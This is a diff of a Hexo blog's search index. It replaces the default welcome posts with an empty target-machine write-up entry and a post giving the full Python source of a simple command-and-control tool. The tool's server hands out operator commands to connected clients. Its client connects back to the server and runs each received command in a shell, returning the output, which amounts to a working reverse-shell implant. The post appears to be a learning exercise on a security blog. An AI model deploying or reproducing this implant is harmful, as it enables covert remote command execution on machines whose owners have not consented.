@@ -1,26 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>hello hexo</title>
-    <url>/2024/12/05/hello-hexo/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/12/05/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Whitedoor靶机</title>
+      <link href="/2024/12/07/Whitedoor%E9%9D%B6%E6%9C%BA/"/>
+      <url>/2024/12/07/Whitedoor%E9%9D%B6%E6%9C%BA/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>python丐版c2</title>
+      <link href="/2024/12/07/python%E4%B8%90%E7%89%88c2/python%E4%B8%90%E7%89%88c2/"/>
+      <url>/2024/12/07/python%E4%B8%90%E7%89%88c2/python%E4%B8%90%E7%89%88c2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h1><p>from socket import *<br>from threading import Thread, Lock<br>import os</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>IP &#x3D; ‘0.0.0.0’<br>PORT &#x3D; 50000<br>BUFLEN &#x3D; 4096</p><h1 id="共享资源"><a href="#共享资源" class="headerlink" title="共享资源"></a>共享资源</h1><p>id_counter &#x3D; 1  # 客户端编号<br>clients &#x3D; []  # 存储已连接客户端的信息<br>Flag &#x3D; True  # 服务端运行状态<br>lock &#x3D; Lock()  # 线程锁，保护共享资源</p><h1 id="客户端处理函数"><a href="#客户端处理函数" class="headerlink" title="客户端处理函数"></a>客户端处理函数</h1><p>def handle_client(dataSocket, addr, cid):<br>    “””处理单个客户端的通信”””<br>    global clients<br>    print(f”客户端连接：{addr}，编号：{cid}”)</p><pre><code>try:    while True:        recved = dataSocket.recv(BUFLEN)        if not recved:            print(f&quot;客户端 &#123;cid&#125; 已断开&quot;)            break        recved_decoded = recved.decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;)        print(f&quot;收到客户端 &#123;cid&#125; 的数据：&#123;recved_decoded&#125;&quot;)        # 回应客户端        dataSocket.send(f&quot;服务端回应：&#123;recved_decoded&#125;&quot;.encode(&#39;utf-8&#39;))except Exception as e:    print(f&quot;处理客户端 &#123;cid&#125; 时出错：&#123;e&#125;&quot;)finally:    # 移除断开连接的客户端    with lock:        clients = [client for client in clients if client[&#39;id&#39;] != cid]    dataSocket.close()    print(f&quot;客户端 &#123;cid&#125; 的线程已终止&quot;)</code></pre><h1 id="监听函数"><a href="#监听函数" class="headerlink" title="监听函数"></a>监听函数</h1><p>def listen():<br>    “””监听客户端连接并创建线程处理”””<br>    global Flag<br>    listenSocket &#x3D; socket(AF_INET, SOCK_STREAM)<br>    listenSocket.bind((IP, PORT))<br>    listenSocket.listen(5)<br>    print(f’服务端已启动，正在监听 {PORT} 端口’)</p><pre><code>try:    while Flag:        listenSocket.settimeout(1)  # 设置超时以检查退出标志        try:            dataSocket, addr = listenSocket.accept()        except timeout:            continue        with lock:            global id_counter            cid = id_counter            id_counter += 1            clients.append(&#123;&#39;id&#39;: cid, &#39;addr&#39;: addr, &#39;socket&#39;: dataSocket&#125;)        # 为每个客户端创建单独线程处理        client_thread = Thread(target=handle_client, args=(dataSocket, addr, cid))        client_thread.daemon = True  # 守护线程        client_thread.start()finally:    listenSocket.close()</code></pre><h1 id="查看连接情况"><a href="#查看连接情况" class="headerlink" title="查看连接情况"></a>查看连接情况</h1><p>def client_list():<br>    “””打印当前已连接的客户端列表”””<br>    print(‘当前已连接的客户端：’)<br>    with lock:<br>        if not clients:<br>            print(“没有已连接的客户端”)<br>        for client in clients:<br>            print(f”编号：{client[‘id’]}，地址：{client[‘addr’]}”)</p><h1 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h1><p>def close_client(cid):<br>    “””关闭指定客户端的连接”””<br>    global clients<br>    with lock:<br>        target_client &#x3D; next((client for client in clients if client[‘id’] &#x3D;&#x3D; cid), None)<br>        if target_client:<br>            try:<br>                target_client[‘socket’].close()<br>                clients &#x3D; [client for client in clients if client[‘id’] !&#x3D; cid]<br>                print(f”客户端 {cid} 已关闭”)<br>            except Exception as e:<br>                print(f”关闭客户端 {cid} 时出错：{e}”)</p><h1 id="发送命令模块"><a href="#发送命令模块" class="headerlink" title="发送命令模块"></a>发送命令模块</h1><p>def cmd():<br>    “””向指定客户端发送命令”””<br>    while True:<br>        if not clients:<br>            print(“当前没有已连接的客户端！”)<br>            return</p><pre><code>    # 列出已连接客户端    print(&quot;当前已连接的客户端：&quot;)    with lock:        for client in clients:            print(f&quot;编号：&#123;client[&#39;id&#39;]&#125;，地址：&#123;client[&#39;addr&#39;]&#125;&quot;)    # 选择客户端    try:        target_id = int(input(&quot;输入目标客户端编号（输入0返回主菜单）：&quot;))        if target_id == 0:            return    except ValueError:        print(&quot;请输入有效的编号！&quot;)        continue    # 查找目标客户端    with lock:        target_client = next((client for client in clients if client[&#39;id&#39;] == target_id), None)    if not target_client:        print(f&quot;客户端 &#123;target_id&#125; 不存在，请重新选择！&quot;)        continue    # 发送命令    try:        command = input(f&quot;向客户端 &#123;target_id&#125; 发送命令（输入&#39;back&#39;返回主菜单）：&quot;)        if command.lower() == &#39;back&#39;:            return        target_client[&#39;socket&#39;].send(command.encode(&#39;utf-8&#39;))        # 如果命令为 exit，则关闭该客户端        if command.lower() == &#39;exit&#39;:            close_client(target_id)            return        # 接收客户端的响应        response = target_client[&#39;socket&#39;].recv(BUFLEN).decode(&#39;utf-8&#39;, errors=&#39;ignore&#39;)        print(f&quot;客户端 &#123;target_id&#125; 响应：&#123;response&#125;&quot;)    except Exception as e:        print(f&quot;与客户端 &#123;target_id&#125; 通信时出错：&#123;e&#125;&quot;)        return</code></pre><h1 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h1><p>def close_all_clients():<br>    “””关闭所有客户端连接”””<br>    global clients<br>    with lock:<br>        for client in clients:<br>            try:<br>                client[‘socket’].close()<br>            except Exception as e:<br>                print(f”关闭客户端 {client[‘id’]} 时出错：{e}”)<br>        clients &#x3D; []</p><p>def menu():<br>    “””显示服务端菜单”””<br>    print(“\n———————————–”)<br>    print(‘1. 查看已连接的客户端’)<br>    print(‘2. 向指定客户端发送命令’)<br>    print(‘3. 退出并关闭服务端’)</p><h1 id="启动监听线程"><a href="#启动监听线程" class="headerlink" title="启动监听线程"></a>启动监听线程</h1><p>listener_thread &#x3D; Thread(target&#x3D;listen)<br>listener_thread.start()</p><h1 id="服务端主控制循环"><a href="#服务端主控制循环" class="headerlink" title="服务端主控制循环"></a>服务端主控制循环</h1><p>try:<br>    while True:<br>        menu()<br>        try:<br>            choice &#x3D; int(input(“输入选择：”))<br>            if choice &#x3D;&#x3D; 1:<br>                client_list()<br>            elif choice &#x3D;&#x3D; 2:<br>                cmd()<br>            elif choice &#x3D;&#x3D; 3:<br>                print(“正在关闭所有客户端和服务端…”)<br>                close_all_clients()<br>                Flag &#x3D; False  # 停止监听线程<br>                break<br>            else:<br>                print(“请输入有效的选项！”)<br>        except ValueError:<br>            print(“请输入数字选项！”)<br>finally:<br>    # 等待监听线程退出<br>    listener_thread.join()<br>    print(“服务端已成功退出”)</p><h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><p>from socket import *<br>import os<br>IP &#x3D; ‘127.0.0.1’<br>PORT &#x3D; 50000<br>BUFLEN &#x3D; 4096<br>dataSocket &#x3D; socket(AF_INET, SOCK_STREAM)<br>dataSocket.connect((IP, PORT))<br>try:<br>    while True:<br>        # 接收命令<br>        recved &#x3D; dataSocket.recv(BUFLEN)<br>        if not recved:<br>            break<br>        command &#x3D; recved.decode(‘utf-8’).strip()<br>        # 判断是否是’cd’命令<br>        if command.startswith(“cd “):<br>            try:<br>                target_dir &#x3D; command[3:].strip()<br>                os.chdir(target_dir)  # 执行目录变化<br>                response &#x3D; f”Changed directory to {os.getcwd()}”<br>            except Exception as e:<br>                response &#x3D; f”Error changing directory: {str(e)}”<br>        else:<br>            # 执行其他命令<br>            try:<br>                from subprocess import Popen, PIPE<br>                process &#x3D; Popen(command, shell&#x3D;True, stdout&#x3D;PIPE, stderr&#x3D;PIPE)<br>                output, errors &#x3D; process.communicate()<br>                # 解码输出内容<br>                output_decoded &#x3D; output.decode(‘utf-8’, errors&#x3D;’ignore’) if output else “No output.”<br>                response &#x3D; f”Output:\n{output_decoded}\n”.strip()<br>            except Exception as e:<br>                response &#x3D; f”Command execution error: {str(e)}”<br>        # 发送命令执行结果给服务端<br>        dataSocket.send(response.encode(‘utf-8’)[:BUFLEN])<br>finally:<br>    dataSocket.close()</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
